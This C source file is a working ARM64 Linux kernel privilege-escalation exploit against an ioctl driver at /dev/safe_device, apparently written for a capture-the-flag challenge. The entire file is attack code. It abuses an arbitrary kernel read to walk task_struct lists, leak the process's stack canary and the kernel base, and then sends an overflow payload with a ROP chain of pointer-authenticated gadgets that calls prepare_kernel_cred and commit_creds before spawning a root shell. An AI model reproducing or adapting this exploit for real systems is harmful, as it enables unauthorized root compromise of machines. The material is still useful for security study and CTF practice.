#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define IOCTL_MAGIC 'k'
#define IOCTL_GET_MSG _IOR(IOCTL_MAGIC, 2, char *)
#define IOCTL_SET_MSG _IOW(IOCTL_MAGIC, 3, char *)

#define DEVICE_PATH "/dev/safe_device"

uint64_t canary_exploit;
uint64_t kbase;
uint64_t task_struct_init;

void start_sh() {
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
}

void set_msg(int fd) {    
    unsigned char user_message[0x400];
    uint64_t gad0 = kbase + 0x7a278 - 0x10000; // 0x00d5306000db4278: ldp x29, x30, [sp, #0x60]; ldr x0, [sp, #0x10]; add sp, sp, #0xc0; autiasp; ret;
    uint64_t gad1 = kbase + 0x63df8 - 0x10000; // 0x00d5306000d9ddf8: ldp x29, x30, [sp, #0x20]; ldr x19, [sp, #0x30]; add sp, sp, #0x40; autiasp; ret;   /// LDP X29, X30, [SP,#0x40+var_20] ; LDR X19, [SP,#0x40+var_10] ; ADD SP, SP, #0x40 ; '@'
    uint64_t gad2 = kbase + 0x870480 - 0x10000; // 0x00d53060015aa480: blr x19; ldp x20, x19, [sp, #0x20]; ldp x22, x21, [sp, #0x10]; ldp x29, x30, [sp], #0x30; autiasp; ret;
    printf("[+] gad0 : %llx & gad1 : %llx & gad2 : %llx\n",gad0,gad1,gad2);

    *(uint64_t*) (user_message + 64) = canary_exploit;
    *(uint64_t*) (user_message + 72) = 0x4242424242424242;
    //*(uint64_t*) (user_message + 80) = 0x4141414141414141;

    *(uint64_t*) (user_message + 0x50) = gad0;
    *(uint64_t*) (user_message + 0x50+0x18) = task_struct_init;
    *(uint64_t*) (user_message + 0x50+0x68) = 0x41;
    *(uint64_t*) (user_message + 0x50+0x70) = gad1;

    *(uint64_t*) (user_message + 0x118+32) = 0x43;
    *(uint64_t*) (user_message + 0x118+40) = gad2;
    *(uint64_t*) (user_message + 0x118+48) = kbase+0x71a38; // prepare_kernel_cred

    *(uint64_t*) (user_message + 0x158) = 0x444444444;
    *(uint64_t*) (user_message + 0x158+8) = gad2;
    *(uint64_t*) (user_message + 0x158+32) = 0xdead;
    *(uint64_t*) (user_message + 0x158+40) = kbase+0x71730; // commit_cred

    *(uint64_t*) (user_message + 0x188) = 0x4545454545;
    *(uint64_t*) (user_message + 0x188+8) = kbase + 0x1313e8 - 0x10000; // 0x00d5306000e6b3e8: ldp x29, x30, [sp, #0x1b0]; add sp, sp, #0x1e0; autiasp; ret;

    *(uint64_t*) (user_message + 0x1b8) = 0x4646;
    *(uint64_t*) (user_message + 0x1b8 + 440) = kbase + 0x21439c - 0x10000; // 0x00d5306000f4e39c: ldp x29, x30, [sp, #0xd0]; add sp, sp, #0x100; autiasp; ret;
    
    printf("[+] Lezgo sploit\n");
    int ret = ioctl(fd, IOCTL_SET_MSG, user_message);
    
    if (ret < 0) {
        perror("ioctl(IOCTL_LOG_MSG) failed");
    } else {
        printf("IOCTL_LOG_MSG succeeded. Check dmesg.\n");
    }


    start_sh();

}

void get_msg(int fd) {
    int ret;
    uint64_t leak;
    uint64_t curr;
    uint64_t prev;
    uint64_t kpage_linmap = 0xffff000000210000;
    uint64_t init_task = kpage_linmap + 0xc837c0 ; // init_task
    uint64_t curr_task = init_task ;
    uint64_t offset_next;
    uint64_t offset_canary;
    uint64_t offset_com;
    uint64_t task_struct_ex;

    // old part to find dynamically next field offset of the task_struct, replaced with hardcoded offset, see the write-up
    // printf("[+] Search for offset_next\n");
    // for (uint64_t i = 1 ; i < 0x1000/8 ; i++){
    //     curr = init_task+(i*8);
    //     prev = curr-8;
    //     ret = ioctl(fd, IOCTL_GET_MSG, &curr);
    //     ret = ioctl(fd, IOCTL_GET_MSG, &prev);
    //     //printf("off : %llx -> vals : %p && %p\n",i*8, curr, prev);
    //     if ( (curr > 0xffff000000cb0000 && curr > 0xffff000000cb0000 ) && (curr < 0xffff000001107000 && curr < 0xffff000001107000) ){
    //         printf("[+] Found offset_next : %llx\n",i*8);
    //         offset_next = i*8;
    //         break;
    //     }
    // }

    offset_next = 0x190;

    printf("[+] Search for com\n");
    for (uint64_t i = 1 ; i < 0x1000/8 ; i++){
        curr = init_task+(i*8);
        ret = ioctl(fd, IOCTL_GET_MSG, &curr);
        if ( !memcmp("swapper",&curr,7) ){
            printf("[+] Found offset_com : %llx\n",i*8);
            offset_com = i*8;
            break;
        }
    }

    uint64_t next_task = curr_task+offset_next;
    ret = ioctl(fd, IOCTL_GET_MSG, &next_task);
    next_task -= offset_next;
    uint64_t check_next;

    printf("[+] Search for canary offset\n"); // not necessary and a bit dirty like this :)
    uint8_t count;

    for (uint64_t i = 1 ; i < 0x1000/8 ; i++){
        count=0;
        curr = init_task+(i*8);
        ret = ioctl(fd, IOCTL_GET_MSG, &curr);

        if ((curr & 0xff) != 0){
            continue;
        }

        if ((curr>>48 & 0xffff) == 0xffff ){
            continue;
        }

        for (uint16_t i=1;i<8;i++){
            if ( (curr>>(i*8) & 0xff) != 0 ){
                count +=1;
            } 
        }

        if (count<4){
            continue;
        }

        offset_canary = i*8;
        printf("[+] Found offset_canary : %llx\n",i*8);
        printf("[+] Res : %llx\n",curr);
        check_next = next_task+i*8;
        ret = ioctl(fd, IOCTL_GET_MSG, &check_next);
        //printf("[+] Res @ next : %llx\n",check_next);
        break;
    }


    while (1){
        leak = curr_task+offset_com;
        ret = ioctl(fd, IOCTL_GET_MSG, &leak);
        //printf("test : %s\n",&leak);
        if (!memcmp("exploit",&leak,7)){
            printf("[+] Task struct exploit @ %p\n",task_struct_ex);
            break;
        }
        curr_task = curr_task+offset_next;
        ret = ioctl(fd, IOCTL_GET_MSG, &curr_task);
        curr_task = curr_task-offset_next;
        task_struct_ex = curr_task;
    }

    leak = task_struct_ex+offset_canary;
    ret = ioctl(fd, IOCTL_GET_MSG, &leak);    
    printf("[+] Canary task exploit @ %p\n",leak);
    canary_exploit = leak;

    printf("[+] Leak kbase virtual via __start_rodata ptr\n");
    leak = kpage_linmap+0x880000+0x10; // __start_rodata
    ret = ioctl(fd, IOCTL_GET_MSG, &leak);    
    printf("[+] __start_rodata : %p\n",leak);
    kbase = leak-0x9aa7ba;
    printf("[+] kbase : %p\n",kbase);

    task_struct_init = init_task;
}

int main() {
    int fd;

    printf("Opening device: %s\n", DEVICE_PATH);
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open the device");
        return -1;
    }
    
    get_msg(fd);
    //getc(stdin);
    set_msg(fd);

    printf("\nClosing device.\n");
    close(fd);
    return 0;
}

